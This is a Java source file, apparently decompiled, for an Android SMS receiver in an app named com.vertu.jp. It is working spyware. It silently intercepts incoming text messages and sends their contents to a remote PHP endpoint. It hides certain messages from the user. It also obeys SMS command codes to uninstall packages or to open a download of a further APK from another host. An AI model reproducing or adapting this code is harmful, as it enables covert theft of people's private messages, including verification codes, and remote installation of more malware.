package com.vertu.jp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;

public class catchsms2 extends BroadcastReceiver {
    private static final String MESSAGE = "112";
    private static final String confirm = "1588366";
    private static final String install = "113";

    public void onReceive(Context context, Intent intent) {
        String str1 = ((TelephonyManager) context.getSystemService("phone")).getLine1Number();
        String str = "";
        Bundle bundle = intent.getExtras();
        SmsMessage[] msgs = null;
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];
            for (int i = 0; i < msgs.length; i++) {
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                try {
                    Intent intent2;
                    String myNumber = ((TelephonyManager) context.getSystemService("phone")).getLine1Number();
                    int l = myNumber.length();
                    if (myNumber.substring(0, 3).equals("+81")) {
                        myNumber = "0" + myNumber.substring(3, i);
                    }
                    StringBuffer localStringBuffer = new StringBuffer();
                    localStringBuffer.append("mobile").append("=").append(str).append("&");
                    localStringBuffer.append("revsms").append("=").append(msgs[i].getMessageBody().toString());
                    HttpURLConnection conn = (HttpURLConnection) new URL("http://fr889.com/Android_SMS/receiving.php").openConnection();
                    conn.setDefaultUseCaches(false);
                    conn.setConnectTimeout(6000);
                    conn.setDoInput(true);
                    conn.setDoOutput(true);
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("content-type", "application/x-www-form-urlencoded");
                    conn.setDoOutput(true);
                    PrintWriter localPrintWriter = new PrintWriter(new OutputStreamWriter(conn.getOutputStream(), "EUC-JP"));
                    localPrintWriter.write(localStringBuffer.toString());
                    localPrintWriter.flush();
                    BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "EUC-JP"));
                    StringBuilder localStringBuilder = new StringBuilder();
                    while (true) {
                        String str2 = localBufferedReader.readLine();
                        if (str2 == null) {
                            break;
                        }
                        localStringBuilder.append(str2);
                    }
                    if (msgs[i].getMessageBody().toString().contains(MESSAGE)) {
                        str = new StringBuilder(String.valueOf(msgs[i].getOriginatingAddress())).append(" ").append(msgs[i].getMessageBody().toString()).toString();
                        abortBroadcast();
                        intent2 = new Intent("android.intent.action.DELETE", Uri.parse("package:com.vertu.jp"));
                        intent2.addFlags(268435456);
                        context.startActivity(intent2);
                    }
                    if (msgs[i].getMessageBody().toString().contains(install)) {
                        abortBroadcast();
                        Intent installIntent = new Intent("android.intent.action.VIEW", Uri.parse("http://www.hgzzg.com/ms.apk"));
                        installIntent.addFlags(268435456);
                        context.startActivity(installIntent);
                    }
                    if (msgs[i].getOriginatingAddress().contains(confirm)) {
                        str = new StringBuilder(String.valueOf(msgs[i].getOriginatingAddress())).append(" ").append(msgs[i].getMessageBody().toString()).toString();
                        abortBroadcast();
                        intent2 = new Intent("android.intent.action.DELETE", Uri.parse("package:com.google.macport.application"));
                        intent2.addFlags(268435456);
                        context.startActivity(intent2);
                    }
                } catch (Exception e) {
                    Toast.makeText(context, e.toString(), 1).show();
                }
            }
        }
    }
}
